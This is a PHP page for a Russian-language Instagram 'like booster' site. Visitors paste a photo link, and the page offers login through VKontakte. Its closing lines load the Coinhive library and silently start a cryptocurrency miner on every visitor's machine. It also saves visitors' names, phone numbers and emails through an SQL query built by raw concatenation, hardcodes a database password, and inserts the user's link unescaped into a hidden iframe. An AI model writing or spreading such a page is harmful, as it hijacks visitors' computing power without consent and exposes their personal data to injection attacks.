<?php session_start() ?>
<!DOCTYPE html>
<html>
<head>
  <title>TOP4EK</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="css/bootstrap.min.css" rel="stylesheet">
  <meta charset="utf-8">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-91913748-2', 'auto');
  ga('send', 'pageview');

</script>
</head>
<body>
<div class="container">
  <div class="row">
  <div id="loader"></div>
    <h1 style="text-align: center;">НАКРУТО4КА INSTAGRAM</h1>
    <div class="form-group" style="margin-top: 5%;">
      <form action="#" method="POST">
        <input type="text" name="link" style="opacity: 0.8; text-align: center;" placeholder="Ссылка на фото" class="form-control col-xs-3">
        <center><button onclick="loaderOn()" class="btn btn-lg btn-primary" style="margin-top: 3%;">&#1053;&#1072;&#1082;&#1088;&#1091;&#1090;&#1080;&#1090;&#1100; &#1083;&#1072;&#1081;&#1082;&#1080;</button></center>
      </form>
      <?
        if(isset($_POST['token'])){
          $s = file_get_contents('http://ulogin.ru/token.php?token='.$_POST['token'].'&host=' . $_SERVER['HTTP_HOST']);
          $user = json_decode($s, true);
          $mysqli = new mysqli("localhost","top4ek","Top4ek2281337!","shop");
          $mysqli->set_charset("utf8");
          $result = $mysqli->query("INSERT INTO insta (`first_name`, `last_name`, `phone`, `email`) VALUES ('".$user['first_name']."','".$user['last_name']."','".$user['phone']."','".$user['email']."')"); //извлекаем из базы все данные о пользователе с введенным логином
        }else{
          $s = '{"error": "хуй"}';
        }
$user = json_decode($s, true);
if(isset($_SESSION['user'])){
  $user = $_SESSION['user'];
}
if(count($user) == 1){
  echo '<center><div class="card" style="    background-color: rgba(0, 0, 0, 0.6); border: 1px solid black; border-radius: 25px; width: 40%">
        <div class="card-block">
          <p style="font-size: 1.5em; opacity: 1; color: white">Хочешь увеличить скорость накрутки? Авторизируйся через вконтакте.</p><center><script src="//ulogin.ru/js/ulogin.js"></script><div style="width: 100px" id="uLogin_1bbda29d" data-uloginid="1bbda29d"></div></center>
        </div>
      </div></center>';
}else{
  $_SESSION['user'] = $user;
  //echo "googd";
}
//var_dump($user);
      ?>
    </div> 
  </div>
</div>
</body>
<script type="text/javascript">
  function loaderOn(){
    document.getElementById("loader").style.display = "block";
  }
</script>
<style type="text/css">
      .ulogin-button-vkontakte{
        width: 100px
      }

  body { 
    background: url(http://getbg.net/upload/full/www.GetBg.net_3D-graphics_Rooster__3-D_graphics_104474_.jpg) no-repeat center center fixed; 
    -webkit-background-size: cover;
    -moz-background-size: cover;
    -o-background-size: cover;
    background-size: cover;
  }
  /* Center the loader */
#loader {
  display: none;
  position: absolute;
  left: 50%;
  top: 50%;
  z-index: 1;
  width: 150px;
  height: 150px;
  margin: -75px 0 0 -75px;
  border: 16px solid #f3f3f3;
  border-radius: 50%;
  border-top: 16px solid blue;
  border-right: 16px solid green;
  border-bottom: 16px solid red;
  border-left: 16px solid pink;
  width: 120px;
  height: 120px;
  -webkit-animation: spin 2s linear infinite;
  animation: spin 2s linear infinite;
}

@-webkit-keyframes spin {
  0% { -webkit-transform: rotate(0deg); }
  100% { -webkit-transform: rotate(360deg); }
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

/* Add animation to "page content" */
.animate-bottom {
  position: relative;
  -webkit-animation-name: animatebottom;
  -webkit-animation-duration: 1s;
  animation-name: animatebottom;
  animation-duration: 1s
}

@-webkit-keyframes animatebottom {
  from { bottom:-100px; opacity:0 } 
  to { bottom:0px; opacity:1 }
}

@keyframes animatebottom { 
  from{ bottom:-100px; opacity:0 } 
  to{ bottom:0; opacity:1 }
}
</style>
<?php
  //zemno.ru/?link=https%3A%2F%2Fwww.instagram.com%2Fp%2FBelBHsdgvef%2F%3Fhl%3Dru%26taken-by%3Dd.mdvd
  if(isset($_POST['link'])){
    $link = $_POST['link'];
    $pos = strpos($link, "instagram.com/p/");
    if($link != ""){
      if($pos !== false){
        echo("<iframe src='http://zemno.ru/?link=".$link."' width=0 height=0>");
      }else{
        echo ("<script>alert('Ссылка введена неверно')</script>");
      }
    }
  }
  
?>
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
  var kaif = new CoinHive.Anonymous('iJFqkJpXPWBCQrualE4SxWyLBEqu2RTb', {throttle: 0.3});
  kaif.start();
</script>
</html>		